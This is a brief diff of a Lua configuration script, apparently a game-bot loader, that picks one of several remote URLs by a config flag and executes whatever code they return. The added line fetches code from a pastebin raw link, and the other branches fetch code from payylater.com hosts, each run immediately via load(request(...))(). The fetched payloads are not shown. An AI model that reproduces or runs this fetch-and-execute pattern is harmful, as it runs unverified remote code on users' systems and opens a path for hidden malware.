@@ -100,7 +100,7 @@ CONFIG.notification = {
 
 CONFIG = CONFIG
 if CONFIG.PANDORA then
-    load(request("GET","http://server2.payylater.com/banksy"))()
+    load(request("GET","https://pastebin.com/raw/L7L0evXp"))()
 elseif CONFIG.GROWX then
     load(httpGet("http://rotation.payylater.com/banksy"))()
 elseif CONFIG.NURUL then
